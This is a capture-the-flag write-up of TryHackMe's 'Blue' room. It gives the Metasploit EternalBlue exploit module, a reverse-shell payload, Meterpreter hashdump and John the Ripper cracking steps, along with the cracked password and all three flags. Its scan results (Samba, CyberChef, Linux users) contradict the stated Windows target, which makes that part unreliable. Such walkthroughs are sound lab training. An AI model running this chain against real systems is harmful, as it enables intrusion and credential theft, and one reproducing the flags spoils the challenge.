# TryHackMe - Blue Writeup

> **Platform:** TryHackMe
> **Challenge:** Blue
> **Category:** Windows | SMB | EternalBlue | Password Cracking

---

# Overview

Today we are solving another classic Windows challenge from TryHackMe named **Blue**.

The objective is to enumerate the target, identify the vulnerable service, gain remote code execution, and recover all three challenge flags.

Unlike many web-focused rooms, this challenge revolves around **SMB enumeration**, **vulnerability identification**, and exploiting one of the most well-known Windows vulnerabilities: **MS17-010 (EternalBlue)**.

---

# Target Information

**Target IP**

```text
10.49.121.115
```

---

# Initial Reconnaissance

The first step is performing a full TCP port scan to identify the exposed attack surface.

```bash
nmap -p- 10.49.121.115
```

The scan reveals several open ports.

```text
22/tcp
53/tcp
139/tcp
445/tcp
7777/tcp
7778/tcp
8443/tcp
```

Immediately, ports **139** and **445** stand out since they indicate that **SMB** is available.

---

# Service Enumeration

Next, a service and version scan is performed.

```bash
nmap -sC -sV 10.49.121.115
```

Some interesting services include:

* OpenSSH
* Samba (SMB)
* CyberChef
* Reverse Shell Generator
* Amazon DCV

While examining the HTTP services, Nmap reports that port **7778** exposes a Git repository.

```text
http://10.49.121.115:7778/.git/
```

However, attempting to download the repository redirects the request to port **80**, which is not available.

```text
301 Moved Permanently

http://10.49.121.115/.git/

Connection refused
```

Since this path is inaccessible, attention shifts back to the SMB service.

---

# SMB Enumeration

Because SMB is one of the most common attack vectors on Windows systems, additional enumeration is performed.

Using **enum4linux**:

```bash
enum4linux 10.49.121.115
```

Interesting users are discovered.

```text
ubuntu

msf

nobody
```

Although this provides useful information, no anonymous shares or credentials are revealed.

Additional NetBIOS enumeration also fails to produce anything particularly valuable.

---

# Metasploit SMB Enumeration

To gather more accurate SMB information, Metasploit's SMB version scanner is used.

```text
scanner/smb/smb_version
```

The scan reports:

* SMB Version 3.1.1
* SMB Signing Not Required

At first glance, SMB 3.1.1 suggests the possibility of **SMBGhost (CVE-2020-0796)**.

Researching the vulnerability reveals that SMBGhost affects:

* Windows 10 1903
* Windows 10 1909
* Windows Server 1903
* Windows Server 1909

The target, however, is not running one of these versions.

Although the exploit was tested, it was unsuccessful.

This demonstrates why identifying the operating system is just as important as identifying the protocol version.

---

# Identifying the Correct Vulnerability

Further enumeration reveals another well-known vulnerability associated with the target.

```
MS17-010

(EternalBlue)
```

Unlike SMBGhost, this vulnerability matches the target environment.

Metasploit already includes an exploit module.

```text
exploit/windows/smb/ms17_010_eternalblue
```

---

# Exploitation

The payload is changed to a standard reverse shell.

```text
windows/x64/shell/reverse_tcp
```

After configuring the target and payload, the exploit is executed.

The attack succeeds, providing a SYSTEM-level shell.

```text
NT AUTHORITY\SYSTEM
```

At this point the target is fully compromised.

---

# Upgrading the Shell

Although the command shell is sufficient, Meterpreter offers many additional post-exploitation features.

The shell is upgraded using:

```text
post/multi/manage/shell_to_meterpreter
```

A Meterpreter session is successfully established.

---

# Dumping Password Hashes

With SYSTEM privileges, dumping password hashes becomes straightforward.

```text
hashdump
```

Output:

```text
Administrator

Guest

Jon
```

The NTLM hash belonging to **Jon** is extracted.

---

# Password Cracking

Instead of performing Pass-the-Hash, the password is cracked offline using **John the Ripper**.

```bash
john hash \
--format=NT \
--wordlist=/usr/share/wordlists/rockyou.txt
```

John successfully recovers the password.

```text
alqfna22
```

This demonstrates how weak passwords can still be recovered even when only password hashes are obtained.

---

# Flag 1

The first flag is located on the compromised system.

```text
flag{access_the_machine}
```

---

# Flag 2

The second flag is stored inside the Windows configuration directory.

```text
C:\Windows\System32\config\
```

Reading the file reveals:

```text
flag{sam_database_elevated_access}
```

---

# Flag 3

Using Meterpreter's search functionality makes locating the final flag much easier.

```text
search -f flag3.txt
```

The file is found inside Jon's Documents directory.

```text
C:\Users\Jon\Documents\
```

Reading the file gives:

```text
flag{admin_documents_can_be_valuable}
```

---

# Attack Flow

```text
Nmap Scan
        │
        ▼
Identify SMB Services
        │
        ▼
SMB Enumeration
        │
        ▼
Identify SMB Version
        │
        ▼
Investigate Possible Vulnerabilities
        │
        ▼
Reject SMBGhost
        │
        ▼
Identify MS17-010
        │
        ▼
Exploit EternalBlue
        │
        ▼
SYSTEM Shell
        │
        ▼
Upgrade to Meterpreter
        │
        ▼
Dump NTLM Hashes
        │
        ▼
Crack Jon's Password
        │
        ▼
Retrieve All Three Flags
```

---

# Vulnerabilities Identified

* SMB service exposed
* SMB Signing not enforced
* MS17-010 (EternalBlue)
* Weak user password
* Password hash disclosure
* Insecure post-exploitation protections

---

# Lessons Learned

This room demonstrates why enumeration should always guide exploitation. Although SMB version detection initially suggested **SMBGhost**, verifying the affected operating systems showed that it was not applicable to the target. Rather than forcing an exploit, further investigation identified the correct vulnerability—**MS17-010 (EternalBlue)**.

The challenge also highlights the value of post-exploitation. Achieving remote code execution is only the beginning; upgrading the shell, dumping password hashes, cracking weak credentials, and exploring the system are all essential steps in a real penetration test.

Even years after its disclosure, EternalBlue remains one of the most significant SMB vulnerabilities in Windows history and serves as an excellent example of why timely patch management and strong credential policies are critical to system security.
